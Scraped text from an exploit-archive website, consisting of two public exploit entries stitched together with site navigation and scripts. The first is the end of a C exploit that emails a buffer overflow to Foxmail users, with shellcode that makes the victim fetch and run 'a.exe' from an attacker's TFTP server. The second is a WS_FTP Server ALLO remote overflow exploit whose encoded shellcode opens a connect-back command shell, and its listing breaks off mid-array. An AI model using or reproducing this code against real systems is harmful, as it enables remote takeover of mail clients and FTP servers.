="\x83\xec\x50\xeb\x0c\xb9\x41\x10\xd3\x5d\xc1\xe9\x08\xff\x11\xeb\x08\x33\xdb\x53\xe8\xec\xff\xff\xff";//tiny shellcode to run WinExec() address in Foxmail.exe module(foxmail 5.0.210 BETA2)unsigned char winexec2[] ="\x83\xec\x50\xeb\x0c\xb9\x41\x10\xa3\x5d\xc1\xe9\x08\xff\x11\xeb\x08\x33\xdb\x53\xe8\xec\xff\xff\xff";#define SMTPPORT 25int  Make_Connection(char *address,int port,int timeout);int  SendXMail(char *mailaddr, char *tftp, char *smtpserver, char *shellcode);int main(int argc, char * argv[]){WSADATA WSAData;char *mailaddr = NULL;char *tftp = NULL;char *smtpserver = NULL;if(argc!=4){printf("Usage: %s <mail_addr> <tftp_server> <smtp_server>\ne.g.:%s eeye@hack.com 202.2.3.4 219.3.2.1\n", argv[0], argv[0]);return 1;}mailaddr=argv[1];tftp=argv[2];smtpserver=argv[3];if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0){printf("WSAStartup failed.\n");WSACleanup();exit(1);}//WinExec() addressSendXMail(mailaddr, tftp, smtpserver, winexec);  //WinExec() address in Foxmail.exe module(foxmail 5.0.300)SendXMail(mailaddr, tftp, smtpserver, winexec2);  //WinExec() address in Foxmail.exe module(foxmail 5.0.210 BETA2)WSACleanup();return 0;}//  ½¨Á¢TCPÁ¬½Ó//  ÊäÈë://       char * address  IPµØÖ·//       int  port       ¶Ë¿Ú//       int  timeout    ÑÓÊ±//  Êä³ö://  ·µ»Ø://       ³É¹¦ >0//       ´íÎó <=0int Make_Connection(char *address,int port,int timeout){struct sockaddr_in target;SOCKET s;int i;DWORD bf;fd_set wd;struct timeval tv;s = socket(AF_INET,SOCK_STREAM,0);if(s<0)return -1;target.sin_family = AF_INET;target.sin_addr.s_addr = inet_addr(address);if(target.sin_addr.s_addr==0){closesocket(s);return -2;}target.sin_port = htons(port);bf = 1;ioctlsocket(s,FIONBIO,&bf);tv.tv_sec = timeout;tv.tv_usec = 0;FD_ZERO(&wd);FD_SET(s,&wd);connect(s,(struct sockaddr *)&target,sizeof(target));if((i=select(s+1,0,&wd,0,&tv))==(-1)){closesocket(s);return -3;}if(i==0){closesocket(s);return -4;}i = sizeof(int);getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);if((bf!=0)||(i!=sizeof(int))){closesocket(s);return -5;}ioctlsocket(s,FIONBIO,&bf);return s;}//send magic mailint  SendXMail(    char *mailaddr, char *tftp, char *smtpserver, char *shellcode){SOCKET  csock;int     ret,i=0;char buf[510], sbuf[0x10000], tmp[500], tmp1[500];csock = Make_Connection(smtpserver, SMTPPORT, 10);if(csock<0){printf("connect err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);ret=send(csock, "HELO server\r\n",strlen("HELO server\r\n"), 0);if(ret<=0){printf("send err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);ret=send(csock, "MAIL FROM: info@sina.com\r\n",strlen("MAIL FROM: info@sina.com\r\n"), 0);if(ret<=0){printf("send err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);sprintf(tmp, "RCPT TO: %s\r\n", mailaddr);ret=send(csock, tmp,strlen(tmp), 0);if(ret<=0){printf("send err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);Sleep(1000);ret=send(csock, "DATA\r\n",strlen("DATA\r\n"), 0);if(ret<=0){printf("send err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);printf("send exploit mail...\n");memset(sbuf, 0, sizeof(sbuf));memset(buf, 0, sizeof(buf));memset(buf, 0x41, sizeof(buf)-1);memset(tmp, 0, sizeof(tmp));//strcpy(tmp, winexec);//WinExec() address in Foxmail.exe module(foxmail 5.0.300)strcpy(tmp, shellcode);//WinExec() address in Foxmail.exe modulestrcat(tmp, "cmd /c tftp -i %s get a.exe&a.exe:");sprintf(tmp1, tmp, tftp);memcpy(buf+0x100-strlen(tmp1), tmp1, strlen(tmp1));*(int *)(buf+0x100)=0x7ffa54cd;  //ret addr jmp esp*(int *)(buf+0x104)=0x80eb80eb;  //jmp back*(int *)(buf+0x108)=0x7ffdf220;  //writeable addr*(int *)(buf+0x110)=0x7ffdf220;  //writeable addrmemcpy(buf, "girl\x0d", 5);sprintf(sbuf, (char *)packet, buf);ret=send(csock, sbuf,strlen(sbuf), 0);if(ret<=0){printf("send err.\n");exit(1);}memset(buf, 0, sizeof(buf));ret=recv(csock, buf, 4096, 0);if(ret<=0){printf("recv err.\n");exit(1);}printf(buf);printf("exploit mail sent.\n");closesocket(csock);return 0;}// milw0rm.com [2004-03-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 165
Ipswitch WS_FTP Server 4.0.2 - ALLO Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDIpswitch WS_FTP Server 4.0.2 - ALLO Remote Buffer OverflowEDB-ID:165CVE:2004-1883EDB Verified:Author:Hugh MannType:remoteExploit:/Platform:WindowsDate:2004-03-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit* (c)2004 Hugh Mann hughmann@hotmail.com** This exploit has been tested with WS_FTP Server 4.0.2.EVAL, Windows XP SP1** NOTE:* - The exploit assumes the user has a total file size limit. If the user only has* a max number of files limit you will need to rewrite parts of this exploit for* it to work.*/#include <winsock2.h>#pragma comment(lib, "ws2_32.lib")#include <windows.h>#include <stdio.h>#include <stdlib.h>#include <string.h>const char* temp_file = "#t#t#t";#define ALLO_STRING "ALLO 18446744073709551615"/** Assume all addresses >= this address to be invalid addresses. If the exploit doesn't work,* try changing it to a larger value, eg. 0x80000000 or 0xC0000000.*/const MAX_ADDR = 0x80000000;/** Size of each thread's stack space. From iFtpSvc.exe PE header. Must be a power of 2.* Should not be necessary to change this since practically all PE files use the default* size (1MB).*/const SERV_STK_SIZE = 0x00100000;/** This is the lower bits of ESP when the ALLO handler is called. This is very WS_FTP Server* version dependent. Should be = ESP (mod SERV_STK_SIZE)*/const SERV_STK_OFFS = 0x0007F208;/** This is the offset of the "this" pointer relative to SERV_STK_OFFS in the ALLO handler.*/const SERV_STK_THIS_OFFS = -(0x210+4); // EBP is saved/** Offset of username relative to the "this" pointer*/const SERV_THIS_USERNAME_OFFS = 0x9F8;/** Offset of FTP cmd buf relative to the "this" pointer*/const SERV_THIS_CMDBUF_OFFS = 0x1F8;/** Offset of EIP relative to vulnerable buffer*/const SERV_BUF_EIP = 0x110;/** Return addresses to JMP ESP instruction. Must contain bytes that are valid shellcode characters.*/#if 1const char* ret_addr = "\xD3\xD9\xE2\x77"; // advapi32.dll (08/29/2002), WinXP SP1#else// mswsock.dll is not loaded by WS_FTP Server, and I haven't investigated which DLL actually loads it// so I don't use this possibly better return address.const char* ret_addr = "\x3D\x40\xA5\x71"; // mswsock.dll (08/23/2001), WinXP SP1 and probably WinXP too#endif#define MAXLINE 0x1000static char inbuf[MAXLINE];static unsigned inoffs = 0;static char last_line[MAXLINE];static int output_all = 0;static int quite_you = 0;void msg2(const char *format, ...){va_list args;va_start(args, format);vfprintf(stdout, format, args);}void msg(const char *format, ...){if (quite_you && output_all == 0)return;va_list args;va_start(args, format);vfprintf(stdout, format, args);}int isrd(SOCKET s){fd_set r;FD_ZERO(&r);FD_SET(s, &r);timeval t = {0, 0};int ret = select(1, &r, NULL, NULL, &t);if (ret < 0)return 0;elsereturn ret != 0;}void print_all(const char* buf, int len = -1){if (len == -1)len = (int)strlen(buf);for (int i = 0; i < len; i++)putc(buf[i], stdout);}int _recv(SOCKET s, char* buf, int len, int flags){int ret = recv(s, buf, len, flags);if (!output_all || ret < 0)return ret;print_all(buf, ret);return ret;}int get_line(SOCKET s, char* string, unsigned len){char* nl;while ((nl = (char*)memchr(inbuf, '\n', inoffs)) == NULL){if (inoffs >= sizeof(inbuf)){msg("[-] Too long line\n");return 0;}int len = _recv(s, &inbuf[inoffs], sizeof(inbuf) - inoffs, 0);if (len <= 0){msg("[-] Error receiving data\n");return 0;}inoffs += len;}strncpy(last_line, inbuf, sizeof(last_line));last_line[sizeof(last_line)-1] = 0;unsigned nlidx = (unsigned)(ULONG_PTR)(nl - inbuf);if (nlidx >= len){msg("[-] Too small caller buffer\n");return 0;}memcpy(string, inbuf, nlidx);string[nlidx] = 0;if (nlidx > 0 && string[nlidx-1] == '\r')string[nlidx-1] = 0;if (nlidx + 1 >= inoffs)inoffs = 0;else{memcpy(inbuf, &inbuf[nlidx+1], inoffs - (nlidx + 1));inoffs -= nlidx + 1;}return 1;}int ignorerd(SOCKET s){inoffs = 0;while (1){if (!isrd(s))return 1;if (_recv(s, inbuf, sizeof(inbuf), 0) < 0)return 0;}}int get_reply_code(SOCKET s, int (*func)(void* data, char* line) = NULL, void* data = NULL){char line[MAXLINE];if (!get_line(s, line, sizeof(line))){msg("[-] Could not get status code\n");return -1;}if (func)func(data, line);char c = line[3];line[3] = 0;int code;if (!(c == ' ' || c == '-') || strlen(line) != 3 || !(code = atoi(line))){msg("[-] Weird reply\n");return -1;}char endline[4];memcpy(endline, line, 3);endline[3] = ' ';if (c == '-'){while (1){if (!get_line(s, line, sizeof(line))){msg("[-] Could not get next line\n");return -1;}if (func)func(data, line);if (!memcmp(line, endline, sizeof(endline)))break;}}return code;}int sendb(SOCKET s, const char* buf, int len, int flags = 0){while (len){int l = send(s, buf, len, flags);if (l <= 0)break;len -= l;buf += l;}return len == 0;}int sends(SOCKET s, const char* buf, int flags = 0){return sendb(s, buf, (int)strlen(buf), flags);}int _send_cmd(SOCKET s, const char* fmt, va_list args, int need_reply){char buf[MAXLINE];buf[sizeof(buf)-1] = 0;if (_vsnprintf(buf, sizeof(buf), fmt, args) < 0 || buf[sizeof(buf)-1] != 0){msg("[-] Buffer overflow\n");return -1;}if (output_all)print_all(buf);if (!ignorerd(s) || !sends(s, buf))return -1;if (need_reply)return get_reply_code(s);return 0;}int send_cmd(SOCKET s, const char* fmt, ...){va_list args;va_start(args, fmt);return _send_cmd(s, fmt, args, 1);}int send_cmd2(SOCKET s, const char* fmt, ...){va_list args;va_start(args, fmt);return _send_cmd(s, fmt, args, 0);}int add_bytes(void* dst, int& dstoffs, int dstlen, const void* src, int srclen){if (dstoffs < 0 || dstoffs + srclen > dstlen || dstoffs + srclen < dstoffs){msg("[-] Buffer overflow ;)\n");return 0;}memcpy((char*)dst+dstoffs, src, srclen);dstoffs += srclen;return 1;}int check_invd_bytes(const char* name, const void* buf, int buflen, int (*chkchar)(char c)){const char* b = (const char*)buf;for (int i = 0; i < buflen; i++){if (!chkchar(b[i])){msg("[-] %s[%u] (%02X) is an invalid character\n", name, i, (unsigned char)b[i]);return 0;}}return 1;}int enc_byte(char& c, char& k, int (*chkchar)(char c)){for (int i = 0; i < 0x100; i++){if (!chkchar(c ^ i) || !chkchar(i))continue;c ^= i;k = i;return 1;}msg("[-] Could not find encryption key for byte %02X\n", c);return 0;}int get_enc_key(char* buf, int size, int offs, int step, int (*chkchar)(char c), int ignore1 = -1, int ignore2 = -1){for (int i = 0; i < 0x100; i++){if (!chkchar(i))continue;for (int j = offs; j < size; j += step){if (ignore1 != -1 && (j >= ignore1 && j <= ignore2))continue; // These bytes aren't encryptedif (!chkchar(buf[j] ^ i))break;}if (j < size)continue;return i;}msg("[-] Could not find an encryption key\n");return -1;}int login(SOCKET s, const char* username, const char* userpass){msg("[+] Logging in as %s...\n", username);int code;if ((code = send_cmd(s, "USER %s\r\n", username)) < 0){msg("[-] Failed to log in #1\n");return 0;}if (code == 331){if ((code = send_cmd(s, "PASS %s\r\n", userpass)) < 0){msg("[-] Failed to log in #2\n");return 0;}}if (code != 230){msg("[-] Failed to log in. Code %3u\n", code);return 0;}msg("[+] Logged in\n");return 1;}class xuser{public:xuser() : s(INVALID_SOCKET) {}~xuser() {close();}int init(unsigned long ip, unsigned short port, const char* username, const char* userpass);void close() {if (s >= 0) closesocket(s); s = INVALID_SOCKET;}SOCKET sock() const {return s;}int exploit(unsigned long sip, unsigned short sport);int read_serv_mem_bytes(unsigned addr, void* dst, int dstlen);int read_serv_mem_string(unsigned addr, char* dst, int dstlen);int read_serv_mem_uint32(unsigned addr, unsigned* dst);protected:int read_serv_mem(unsigned addr, void* dst, int dstlen);SOCKET s;char username[260];char userpass[260];unsigned long ip;unsigned short port;};/** XAUT code tested with WS_FTP Server 4.0.2.EVAL*/#define XAUT_2_KEY 0x49327576int xaut_encrypt(char* dst, const char* src, int len, unsigned long key){unsigned char keybuf[0x80*4];for (int i = 0; i < sizeof(keybuf)/4; i++){keybuf[i*4+0] = (char)key;keybuf[i*4+1] = (char)(key >> 8);keybuf[i*4+2] = (char)(key >> 16);keybuf[i*4+3] = (char)(key >> 24);}for (int i = 0; i < len; i++){if (i >= sizeof(keybuf)){msg("[-] xaut_encrypt: Too long input buffer\n");return 0;}*dst++ = *src++ ^ keybuf[i];}return 1;}char* xaut_unpack(char* src, int len, int delete_it){char* dst = new char[len*2 + 1];for (int i = 0; i < len; i++){dst[i*2+0] = ((src[i] >> 4) & 0x0F) + 0x35;dst[i*2+1] = (src[i] & 0x0F) + 0x31;}dst[i*2] = 0;if (delete_it)delete src;return dst;}int xaut_login(SOCKET s, int d, const char* username, const char* password, unsigned long key){msg("[+] Logging in [XAUT] as %s...\n", username);int ret = 0;char* dst = NULL;__try{const char* middle = ":";dst = new char[strlen(username) + strlen(middle) + strlen(password) + 1];strcpy(dst, username);strcat(dst, middle);strcat(dst, password);int len = (int)strlen(dst);if ((d == 2 && !xaut_encrypt(dst, dst, len, XAUT_2_KEY)) || !xaut_encrypt(dst, dst, len, key))__leave;dst = xaut_unpack(dst, len, 1);if (send_cmd(s, "XAUT %d %s\r\n", d, dst) != 230)__leave;ret = 1;}__finally{delete dst;}if (!ret)msg("[-] Failed to log in\n");elsemsg("[+] Logged in\n");return ret;}struct my_data{unsigned long key;int done_that;char hostname[256];};int line_callback(void* data, char* line){my_data* m = (my_data*)data;if (m->done_that)return 1;/** Looking for a line similar to:** "220-FTP_HOSTNAME X2 WS_FTP Server 4.0.2.EVAL (41541732)\r\n"*/char* s, *e;if (strncmp(line, "220", 3) || !strstr(line, "WS_FTP Server") ||(s = strrchr(line, '(')) == NULL || (e = strchr(s, ')')) == NULL)return 1;char buf[0x10];int len = (int)(ULONG_PTR)(e - (s+1));if (len >= sizeof(buf) || len > 10)return 1;memcpy(buf, s+1, len);buf[len] = 0;for (int i = 0; i < len; i++){if (!isdigit((unsigned char)buf[i]))return 1;}m->key = atol(buf);for (int i = 4, len = (int)strlen(line); i < len; i++){if (i-4 >= sizeof(m->hostname))return 1;m->hostname[i-4] = line[i];if (line[i] == ' ')break;}m->hostname[i-4] = 0;if (m->hostname[0] == 0)return 1;m->done_that = 1;return 1;}int xuser::init(unsigned long _ip, unsigned short _port, const char* _username, const char* _userpass){ip = _ip;port = _port;close();strncpy(username, _username, sizeof(username));if (username[sizeof(username)-1] != 0){msg("[-] username too long\n");return 0;}strncpy(userpass, _userpass, sizeof(userpass));if (userpass[sizeof(userpass)-1] != 0){msg("[-] userpass too long\n");return 0;}sockaddr_in saddr;memset(&saddr, 0, sizeof(saddr));saddr.sin_family = AF_INET;saddr.sin_port = htons(port);saddr.sin_addr.s_addr = htonl(ip);in_addr a; a.s_addr = htonl(ip);msg("[+] Connecting to %s:%u...\n", inet_ntoa(a), port);s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if (s < 0 || connect(s, (sockaddr*)&saddr, sizeof(saddr)) < 0){msg("[-] Could not connect\n");return 0;}msg("[+] Connected\n");my_data m;memset(&m, 0, sizeof(m));int code = get_reply_code(s, line_callback, &m);if (code != 220){msg("[-] Got reply %3u\n", code);return 0;}else if (!m.done_that){msg("[-] Could not find XAUT key or host name => Not a WS_FTP Server\n");return 0;}if (!xaut_login(s, 0, username, userpass, m.key) && !login(s, username, userpass))return 0;// Don't want UTF8 conversionsif (send_cmd(s, "LANG en\r\n") != 200){msg("[-] Apparently they don't understand the english language\n");return 0;}if (send_cmd(s, "NOOP step into the light\r\n") != 200){msg("[-] C4n't k1ll 4 z0mbie\n");return 0;}return 1;}SOCKET get_data_sock(SOCKET s, const char* filename, const char* cmd){SOCKET sd = INVALID_SOCKET;int error = 1;__try{sockaddr_in saddr;int len = sizeof(saddr);if (getsockname(s, (sockaddr*)&saddr, &len) < 0 || len != sizeof(saddr) ||(sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)__leave;sockaddr_in daddr;memset(&daddr, 0, sizeof(daddr));daddr.sin_family = AF_INET;daddr.sin_port = 0;daddr.sin_addr.s_addr = saddr.sin_addr.s_addr;len = sizeof(daddr);if (bind(sd, (sockaddr*)&daddr, sizeof(daddr)) < 0 || listen(sd, 1) < 0 ||getsockname(sd, (sockaddr*)&daddr, &len) < 0 || len != sizeof(daddr))__leave;unsigned long ip = ntohl(daddr.sin_addr.s_addr);unsigned short port = ntohs(daddr.sin_port);if (send_cmd(s, "PORT %u,%u,%u,%u,%u,%u\r\n",(unsigned char)(ip >> 24),(unsigned char)(ip >> 16),(unsigned char)(ip >> 8),(unsigned char)ip,(unsigned char)(port >> 8),(unsigned char)port) != 200)__leave;if (send_cmd2(s, "%s %s\r\n", cmd, filename) < 0)__leave;msg("[+] Waiting for server to connect...\n");SOCKET sa;sockaddr_in aaddr;len = sizeof(aaddr);if ((sa = accept(sd, (sockaddr*)&aaddr, &len)) < 0)__leave;closesocket(sd);sd = sa;if (get_reply_code(s) != 150)__leave;error = 0;}__finally{if (error){msg("[-] Could not create data connection, %u\n", GetLastError());closesocket(sd);sd = INVALID_SOCKET;}elsemsg("[+] Server connected\n");}return sd;}int create_file(SOCKET s, const char* tmpname, unsigned size = 1){int ret = 0;SOCKET sd = INVALID_SOCKET;__try{if (size > 1 && send_cmd(s, "REST %u\r\n", size) != 350)__leave;if ((sd = get_data_sock(s, tmpname, "STOR")) < 0)__leave;ret = 1;}__finally{if (sd >= 0)closesocket(sd);}if (ret && get_reply_code(s) != 226)ret = 0;return ret;}const unsigned int shlc2_offs_encstart = 0x0000002B;const unsigned int shlc2_offs_encend = 0x000001B8;const unsigned int shlc2_offs_enckey = 0x00000025;unsigned char shlc2_code[] ="\xEB\x16\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56""\x34\x12\x5B\x53\x83\xEB\x1D\xC3\xE8\xF5\xFF\xFF\xFF\x33\xC9\xB1""\x64\x81\x74\x8B\x27\x55\x55\x55\x55\xE2\xF6\xFC\x8B\x43\x0A\x31""\x43\x02\x8B\x43\x0E\x31\x43\x06\x89\x4B\x0A\x89\x4B\x0E\x64\x8B""\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\xAD\x8B\x68\x08\x8D""\x83\x67\x01\x00\x00\x55\xE8\xB7\x00\x00\x00\x68\x33\x32\x00\x00""\x68\x77\x73\x32\x5F\x54\xFF\xD0\x96\x8D\x83\x74\x01\x00\x00\x56""\xE8\x9D\x00\x00\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x01\x01\x00""\x00\xFF\xD0\x8D\x83\x7F\x01\x00\x00\x56\xE8\x83\x00\x00\x00\x33""\xC9\x51\x51\x51\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x97\x8D\x83\x8A""\x01\x00\x00\x56\xE8\x69\x00\x00\x00\x33\xC9\x51\x51\x51\x51\x6A""\x10\x8D\x4B\x02\x51\x57\xFF\xD0\xB9\x54\x00\x00\x00\x2B\xE1\x88""\x6C\x0C\xFF\xE2\xFA\xC6\x44\x24\x10\x44\x41\x88\x4C\x24\x3C\x88""\x4C\x24\x3D\x89\x7C\x24\x48\x89\x7C\x24\x4C\x89\x7C\x24\x50\x49""\x8D\x44\x24\x10\x54\x50\x51\x51\x51\x6A\x01\x51\x51\x8D\x83\xA4""\x01\x00\x00\x50\x51\x8D\x83\x95\x01\x00\x00\x55\xE8\x11\x00\x00""\x00\x59\xFF\xD0\x8D\x83\xAC\x01\x00\x00\x55\xE8\x02\x00\x00\x00""\xFF\xD0\x60\x8B\x7C\x24\x24\x8D\x6F\x78\x03\x6F\x3C\x8B\x6D\x00""\x03\xEF\x83\xC9\xFF\x41\x3B\x4D\x18\x72\x0B\x64\x89\x0D\x00\x00""\x00\x00\x8B\xE1\xFF\xE4\x8B\x5D\x20\x03\xDF\x8B\x1C\x8B\x03\xDF""\x8B\x74\x24\x1C\xAC\x38\x03\x75\xDC\x43\x84\xC0\x75\xF6\x8B\x5D""\x24\x03\xDF\x0F\xB7\x0C\x4B\x8B\x5D\x1C\x03\xDF\x8B\x0C\x8B\x03""\xCF\x89\x4C\x24\x1C\x61\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61""\x72\x79\x41\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57""\x53\x41\x53\x6F\x63\x6B\x65\x74\x41\x00\x57\x53\x41\x43\x6F\x6E""\x6E\x65\x63\x74\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65""\x73\x73\x41\x00\x63\x6D\x64\x2E\x65\x78\x65\x00\x45\x78\x69\x74""\x